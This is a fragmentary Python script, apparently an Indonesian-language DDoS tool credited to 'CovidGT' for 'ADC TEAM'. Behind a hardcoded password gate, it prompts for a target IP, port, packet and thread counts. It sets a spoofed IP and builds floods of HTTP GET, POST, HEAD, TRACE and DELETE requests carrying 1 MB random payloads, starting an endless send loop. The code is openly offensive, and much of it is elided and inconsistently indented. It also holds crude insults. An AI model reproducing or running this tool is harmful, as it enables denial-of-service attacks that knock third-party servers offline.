...
import os
os.system('cls')
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Tools ADC V2 Code By CovidGT [ Password? ]") 
print('''
  __  __                     _     _          _____                                           _ 
 |  \/  |                   | |   (_)        |  __ \                                         | |
 | \  / |  __ _  ___  _   _ | | __ _  _ __   | |__) |__ _  ___  ___ __      __ ___   _ __  __| |
 | |\/| | / _` |/ __|| | | || |/ /| || '_ \  |  ___// _` |/ __|/ __|\ \ /\ / // _ \ | '__|/ _` |
 | |  | || (_| |\__ \| |_| ||   < | || | | | | |   | (_| |\__ \\__ \ \ V  V /| (_) || |  | (_| |
 |_|  |_| \__,_||___/ \__,_||_|\_\|_||_| |_| |_|    \__,_||___/|___/  \_/\_/  \___/ |_|   \__,_|                                                                                                
''')
password = input("[ + ] Password? : ")
if password == "icloud":
    print("Berhasil Tolong Jangan Di Leak. Untuk iCloud.  Tool Ada Save.dat!!")
    time.sleep(2)
else :
    print("Password Salah Karna Muka Mu Jelek Sih:v")
...
if sys.platform.startswith("linux"):
   ...
   os.system('clear')
	...
	os.system('color ' +random.choice(['b', 'a', 'c', 'd'])+ " & cls & title DDoS.Py [ ADC TEAM!! ]")
print('''
 ...
 /_/    \_\ |_____/   \_____|     \/    |____|
    [> Tool By CovidGT For A D C TIM <]
''')
ip = str(input("[?] IP: "))
os.system('cls')
os.system('color ' +random.choice(['c', 'b', 'a', 'd'])+ " & cls & title ADC.py [ Enter Port Target ]")
print('''
Port : 80/443/3309
''')
port = int(input("[?] PORT : "))
os.system('cls')
os.system('color ' +random.choice(['d', 'b', 'c', 'a'])+ " & cls & title ADC.py [ Enter Target Method ]")
print('''
Pilih Y
''')
method_attack = str(input("[?] Using Socket [Y/N]      : "))
os.system('cls')
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title ADC.py [ Enter Target Packet ]") 
print('''
Tulis 60048
''')
times = int(input("[?] Packet [60048]    : "))
os.system('cls')
os.system('color ' +random.choice(['b', 'a', 'c', 'd'])+ " & cls & title ADC.py [ Enter Thread]")
print('''
Tulis 9024
''')
threads = int(input("[?] Thread [ 9024 ]    : "))
os.system('cls')
fake_ip = '20.92.90.243'
...
def Headers(method):
    ...
    if method == "get" or method == "post":
        post_host = "POST /Mampus_Kau_Kontol_Kena_DDoS HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['7'])+ " & cls & title ADC.py [ Attack By ADC ]")
def run():
    header = Headers("get")
    i = random.choice(("+","!","#"))
    data = random._urandom(1000000) 
    if method_attack == "1":
        get_host = "GET /Mampus_Kau_Kontol_Kena_DDoS HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD', 'TRACE', 'DELETE']) + " /Mampus_Kau_Kontol_Kena_DDoS HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
